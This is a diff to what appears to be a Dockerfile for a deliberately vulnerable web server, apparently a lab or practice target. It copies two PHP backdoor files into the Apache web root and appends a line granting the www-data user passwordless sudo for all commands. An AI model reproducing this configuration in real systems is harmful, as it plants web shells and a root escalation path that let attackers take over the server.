@@ -9,3 +9,9 @@ RUN apt-get update && \
     apt-get install nano -y
 
 COPY simplebackdoor.php /var/www/html
+COPY php-backdoor.php /var/www/html
+
+RUN service apache2 start
+RUN echo "www-data ALL = NOPASSWD: ALL" >> /etc/sudoers
+
+EXPOSE 80
